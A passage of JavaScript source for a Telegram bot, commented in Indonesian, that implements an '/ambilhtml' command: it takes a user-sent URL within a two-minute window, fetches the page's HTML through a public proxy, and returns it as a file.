      const expiresAt = Date.now() + 2 * 60 * 1000; // 2 menit
      const t = setTimeout(() => {
        pendingHtml.delete(key);
        // optional notify: bot.sendMessage(chatId, "⏱️ Waktu habis. Ketik /ambilhtml lagi jika mau.");
      }, 2 * 60 * 1000);

      pendingHtml.set(key, { expiresAt, timeout: t });
    })
    .catch(err => {
      console.error("failed to send prompt :", err);
    });
});

// Tangani pesan teks (URL) — cukup kirim URL biasa, tidak perlu reply
bot.on('message', async (msg) => {
  try {
    // hanya proses pesan teks yang bukan command (menghindari intercept command lain)
    if (!msg.text || msg.text.startsWith('/')) return;

    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const key = `${chatId}:${fromId}`;
    const pending = pendingHtml.get(key);
    if (!pending) return; // tidak dalam mode ambilhtml

    // cek timeout
    if (Date.now() > pending.expiresAt) {
      clearTimeout(pending.timeout);
      pendingHtml.delete(key);
      return bot.sendMessage(chatId, "[ ⏱️ ] waktu untuk mengirim url telah habis ketik /ambilhtml untuk memulai kembali fitur tersebut");
    }

    const url = msg.text.trim();
    if (!/^https?:\/\//i.test(url)) {
      return bot.sendMessage(chatId, "[ ❌ ] URL tidak valid. Pastikan diawali http:// atau https://");
    }

    // beri tahu sedang memproses (opsional)
    const progressMsg = await bot.sendMessage(chatId, `🔄 mengambil : ${url}\nmohon tunggu . . .`);

    // gunakan proxy untuk menghindari CORS/robot (sama seperti implementasimu)
    const proxy = "https://api.allorigins.win/raw?url=" + encodeURIComponent(url);

    // Lakukan fetch
    const res = await fetch(proxy);
    if (!res.ok) throw new Error(`gagal mengambil website ( status ${res.status} )`);
    const html = await res.text();

    // Simpan sementara file HTML
    const filename = `website_${Date.now()}.html`;
    const filepath = path.join(__dirname, filename);
    fs.writeFileSync(filepath, html, 'utf8');

    // Kirim file HTML (pakai stream)
    await bot.sendDocument(chatId, fs.createReadStream(filepath), {}, { filename });

    // Hapus file sementara
    try { fs.unlinkSync(filepath); } catch (e) { /* ignore */ }

    // bersihkan pending dan timeout
    clearTimeout(pending.timeout);
    pendingHtml.delete(key);

    // edit pesan progress menjadi sukses (jika bisa)
    try {
      await bot.editMessageText(`[ ✅ ] berhasil mengambil website :\n${url}`, { chat_id: chatId, message_id: progressMsg.message_id });
    } catch (e) {
      // kalau edit gagal, kirim pesan baru
      await bot.sendMessage(chatId, `[ ✅ ] berhasil mengambil website : ${url}`);
    }
  } catch (e) {
    console.error("ambilhtml error :", e);
    // coba beri tahu user (aman jika msg dan chat tersedia)
    if (msg && msg.chat && msg.chat.id) {
      bot.sendMessage(msg.chat.id, `[ ❌ ] gagal : ${e.message}`);
    }
  }
});
